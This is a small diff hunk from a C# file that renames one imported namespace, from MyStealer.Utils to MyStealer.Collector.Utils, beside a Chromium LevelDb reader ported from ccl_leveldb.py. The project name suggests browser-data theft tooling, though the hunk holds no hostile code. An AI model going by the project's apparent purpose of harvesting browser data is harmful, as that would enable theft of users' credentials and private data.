@@ -30,7 +30,7 @@ using System.Text;
 using Snappy;
 using System.Collections.Immutable;
 using MyStealer.Utils.Chromium.LevelDb;
-using MyStealer.Utils;
+using MyStealer.Collector.Utils;
 
 /// <summary>
 /// Ported from ccl_leveldb.py using pytocs 2.0.0-3150cbcd42
